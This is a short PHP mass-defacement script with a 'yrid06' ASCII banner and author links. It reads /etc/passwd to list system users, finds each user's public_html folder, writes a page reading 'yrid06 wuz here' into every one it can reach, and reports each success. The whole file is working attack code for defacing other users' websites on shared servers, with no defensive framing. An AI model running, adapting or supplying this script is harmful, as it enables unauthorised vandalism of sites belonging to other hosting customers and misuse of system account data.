<?php

// fb.com/iamkuja
// github.com/iamkuja
// iamkuja.github.io

echo "
__  __     _     ______  _____
\ \/ /____(_)___/ / __ \/ ___/
 \  / ___/ / __  / / / / __ \ 
 / / /  / / /_/ / /_/ / /_/ / 
/_/_/  /_/\__,_/\____/\____/  
                              
";

$dp = "yrid06 wuz here";
$passwd = file("/etc/passwd");
foreach ($passwd as $user) {
	$users = explode(":", $user);
	$dir = "/home/$users[0]/public_html";
	if(!is_readable($dir)) {
		// lo bacot
	} else {
		fwrite(fopen($dir."/yrid06.html", "w"), $dp);
		if(!is_file($dir."/yrid06.html")) {
			// lo bacot
		} else {
			echo $dir."/yrid06.html => SUCCESS\n";
		}
	}
}

?>
